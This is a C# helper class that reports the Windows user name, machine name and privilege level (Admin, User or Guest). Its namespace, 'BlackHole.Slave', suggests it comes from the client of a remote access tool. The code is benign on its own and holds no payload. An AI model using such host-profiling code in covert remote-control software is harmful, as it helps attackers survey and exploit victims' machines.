using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace BlackHole.Slave.Helper
{
    public static class WindowsHelper
    {
        public static string UserName => Environment.UserName;
        public static string MachineName => Environment.MachineName;
        public static string AccountType
        {
            get
            {
                using (var identity = WindowsIdentity.GetCurrent())
                {
                    if (identity != null)
                    {
                        var principal = new WindowsPrincipal(identity);
                        if (principal.IsInRole(WindowsBuiltInRole.Administrator))
                            return "Admin";
                        if (principal.IsInRole(WindowsBuiltInRole.User))
                            return "User";
                        if (principal.IsInRole(WindowsBuiltInRole.Guest))
                            return "Guest";
                    }
                    return "Unknow";
                }
            }
        }
    }
}
